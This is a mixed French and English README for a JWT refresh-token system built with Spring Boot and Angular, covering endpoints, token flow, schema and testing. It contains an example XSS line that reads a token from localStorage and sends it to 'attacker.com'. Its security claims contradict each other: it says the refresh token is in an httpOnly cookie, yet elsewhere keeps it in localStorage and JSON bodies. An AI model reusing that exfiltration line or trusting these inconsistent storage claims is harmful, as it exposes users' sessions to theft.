# 🔐 JWT Refresh Token Implementation

## � Mise à jour v2.0 : httpOnly Cookies

✅ **Les refresh tokens sont maintenant sécurisés avec des httpOnly cookies !**

### Avant (Vulnérable) 🚨

```
Refresh token stocké en localStorage
↓
Accessible via JavaScript
↓
Vulnérable aux attaques XSS
```

### Après (Sécurisé) ✅

```
Refresh token en httpOnly cookie
↓
IMPOSSIBLE d'accéder via JavaScript
↓
Automatiquement envoyé par le navigateur
↓
Protégé contre XSS
```

---

## 📋 Architecture (v2.0)

```
Login Flow:
  ↓
User → /auth/login (username + password)
  ↓
Server → BCrypt validation
  ↓
Return:
  - accessToken (15 min expiration) in response body
  - refreshToken (7 days) in httpOnly cookie ← SECURE
  ↓
Client → Stores accessToken in localStorage, cookie managed by browser
```

---

## 🛡️ httpOnly Cookies - Avantages de Sécurité

### ✅ Protection contre XSS (Attaques par injection JavaScript)

**localStorage (avant)** 🚨 :

```javascript
// Attaquant peut faire :
const stolenToken = localStorage.getItem("refresh_token");
fetch("https://attacker.com/steal?token=" + stolenToken);
```

**httpOnly Cookie (maintenant)** ✅ :

```javascript
// JavaScript ne peut PAS accéder aux httpOnly cookies
console.log(document.cookie); // Ne contient PAS le refresh token!
// Le cookie est automatiquement envoyé par le navigateur
```

### Propriétés du Cookie

```java
ResponseCookie cookie = ResponseCookie
    .from("refreshToken", token)
    .httpOnly(true)      // ← JavaScript ne peut pas accéder
    .secure(true)        // ← HTTPS only en production
    .path("/auth")       // ← Cookie envoyé seulement pour /auth/*
    .maxAge(7 * 24 * 60 * 60) // ← 7 jours
    .sameSite("Lax")     // ← Protection CSRF
    .build();
```

---

## 🔄 Nouveau Flux avec httpOnly Cookies

### 1. **RefreshToken Entity** (`RefreshToken.java`)

- Stores refresh tokens in database
- User ID, token string, expiration date
- Method: `isExpired()` to check validity

```java
@Entity
@Table(name = "refresh_token")
public class RefreshToken {
    private User user;
    private String token;      // UUID
    private Instant expiryDate; // 7 days from creation
}
```

### 2. **JWT Token Types** (`JwtUtils.java`)

- **Access Token**: 15 minutes (used for API calls)
- **Refresh Token**: 7 days (stored server-side, used only for refreshing)

```java
generateAccessToken(username)   // 15 min
generateRefreshToken(username)  // 7 days
```

### 3. **RefreshTokenService** (`RefreshTokenService.java`)

- Creates/validates refresh tokens
- Verifies expiration
- Deletes expired tokens
- One refresh token per user

### 4. **AuthController Endpoints**

#### POST `/auth/login`

**Request**:

```json
{
  "username": "john",
  "password": "password123"
}
```

**Response** (200):

```json
{
  "accessToken": "eyJhbGc...",
  "refreshToken": "uuid-string-here",
  "tokenType": "Bearer",
  "expiresIn": 900 // in seconds
}
```

#### POST `/auth/refresh`

**Request**:

```json
{
  "refreshToken": "uuid-string-here"
}
```

**Response** (200):

```json
{
  "accessToken": "eyJhbGc...",
  "refreshToken": "same-or-new-uuid",
  "tokenType": "Bearer",
  "expiresIn": 900
}
```

#### POST `/auth/logout`

**Headers**:

```
Authorization: Bearer <accessToken>
```

**Response** (200):

```json
{
  "message": "Logged out successfully"
}
```

- Deletes refresh token from DB
- Client clears localStorage

---

## 🎯 Frontend Components

### 1. **TokenService** (`token.ts`)

- Manages both tokens in localStorage
- Methods:
  - `setAccessToken(token)` / `getAccessToken()`
  - `setRefreshToken(token)` / `getRefreshToken()`
  - `setTokens(access, refresh)` - save both at once
  - `clear()` - logout

### 2. **JwtInterceptor** (`jwt-interceptor.ts`)

- **Adds** access token to all requests
- **Auto-refreshes** when 401 received
- **Retries** original request with new token
- **Redirects** to login if refresh fails

**Flow**:

```
1. Request made → Add accessToken to header
2. Response 401? → Try refresh
3. Refresh OK? → Retry request with new token
4. Refresh FAIL? → Clear tokens → Redirect to login
```

### 3. **AuthService** (`auth.ts`)

- `login(username, password)` → returns LoginResponse
- `refreshToken(refreshToken)` → returns new LoginResponse
- `logout()` → calls backend + clears tokens
- `saveTokens(access, refresh)` → stores both
- `isAuthenticated()` → checks access token validity

### 4. **Login Component** (`login.ts`)

- Receives LoginResponse with both tokens
- Calls `authService.saveTokens(access, refresh)`
- Stores in localStorage

---

## 🔄 Token Refresh Flow

### Scenario: Access token expires during API call

```
1. User makes API request
   ↓
2. JwtInterceptor adds accessToken to header
   ↓
3. Backend returns 401 (token expired)
   ↓
4. JwtInterceptor catches 401
   ↓
5. Check if refreshToken exists?
   ↓ YES → Step 6
   ↓ NO  → Logout & redirect to login
   ↓
6. Call POST /auth/refresh with refreshToken
   ↓
7. Backend validates refreshToken
   ↓ VALID  → Return new accessToken
   ↓ EXPIRED → Delete from DB & reject
   ↓
8. If success: Store new tokens
   ↓
9. Retry original request with new accessToken
   ↓
10. Original request succeeds
```

---

## 🛡️ Security Best Practices

### ✅ What's protected:

| Element           | Protection                                 |
| ----------------- | ------------------------------------------ |
| **Access Token**  | Short-lived (15 min), signed JWT           |
| **Refresh Token** | Long-lived, UUID, stored in DB, not signed |
| **Password**      | BCrypt(12) hash, never transmitted         |
| **Token Storage** | localStorage (accessible via XSS)          |

### ⚠️ Against XSS:

- Tokens in localStorage = vulnerable to XSS
- **Mitigation**: Content Security Policy (CSP), input sanitization
- **Better option**: Use httpOnly cookies (requires backend update)

### ⚠️ Against CSRF:

- POST endpoints require body (not vulnerable to CSRF)
- **Best practice**: Add CSRF token for state-changing operations

### ⚠️ Against Token Theft:

- Use HTTPS only (enforce in production)
- Validate token signature on backend
- Check token expiration server-side
- One refresh token per user (prevents replay attacks)

---

## 📝 Database Schema

```sql
CREATE TABLE refresh_token (
    id BIGINT PRIMARY KEY AUTO_INCREMENT,
    user_id BIGINT NOT NULL UNIQUE,
    token VARCHAR(255) NOT NULL UNIQUE,
    expiry_date TIMESTAMP NOT NULL,
    FOREIGN KEY (user_id) REFERENCES app_user(id) ON DELETE CASCADE
);
```

---

## 🚀 Testing

### 1. Test successful login:

```bash
curl -X POST http://localhost:8080/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"john","password":"password123"}'
```

Response:

```json
{
  "accessToken": "eyJ...",
  "refreshToken": "uuid",
  "tokenType": "Bearer",
  "expiresIn": 900
}
```

### 2. Test refresh token:

```bash
curl -X POST http://localhost:8080/auth/refresh \
  -H "Content-Type: application/json" \
  -d '{"refreshToken":"uuid"}'
```

### 3. Test expired refresh token:

- Wait for token to expire (or manually update DB)
- Try to refresh → Should get 401

### 4. Test access token auto-refresh (Frontend):

- Make request with expired token
- Interceptor should automatically refresh
- Original request should succeed

---

## 🔧 Configuration

### Backend (`SecurityConfig.java`)

- Password encoder: BCryptPasswordEncoder(12)
- CORS: Allow localhost:4200
- Session: Stateless (JWT)

### Frontend (`app.config.ts`)

- Interceptor: Added to HTTP_INTERCEPTORS
- BASE_URL: http://localhost:8080

### Environment Variables

```properties
# Backend
JWT_SECRET=CHANGE_ME_SUPER_SECRET_KEY_256_BITS_MIN
JWT_ACCESS_EXPIRATION=900000     # 15 min in ms
JWT_REFRESH_EXPIRATION=604800000 # 7 days in ms

# Frontend
API_BASE_URL=http://localhost:8080
```

---

## ❌ Common Issues & Fixes

### Issue: 401 on every request

- **Cause**: Token not being added by interceptor
- **Fix**: Check if token is in localStorage, verify interceptor is registered

### Issue: Refresh loop (infinite refreshes)

- **Cause**: Both tokens expired, refresh endpoint rejects
- **Fix**: Logout and redirect to login

### Issue: CORS error on refresh

- **Cause**: CORS not allowing refresh endpoint
- **Fix**: Add `/auth/refresh` to CORS allowlist

### Issue: Token stored but not sent

- **Cause**: Interceptor not cloning request properly
- **Fix**: Use `req.clone()` to modify headers

---

## 📚 Next Steps

1. **Add refresh token rotation**
   - Generate new refresh token on each use
   - Invalidate old token

2. **Add token revocation list (blacklist)**
   - Logout invalidates token immediately
   - Check blacklist before accepting token

3. **Add refresh token expiration reminder**
   - Warn user 1 day before refresh token expires
   - Force re-login before expiration

4. **Use httpOnly cookies** (more secure than localStorage)
   - Server sets refreshToken as httpOnly cookie
   - Cannot be accessed by JavaScript
   - Protected against XSS

5. **Add rate limiting**
   - Limit failed login attempts
   - Limit refresh token requests

---

## 📖 References

- [JWT Best Practices (RFC 8725)](https://datatracker.ietf.org/doc/html/rfc8725)
- [OWASP JWT Security](<https://owasp.org/www-community/JSON_Web_Token_(JWT)>)
- [Spring Security JWT](https://spring.io/guides/tutorials/spring-security-and-angular-js/)
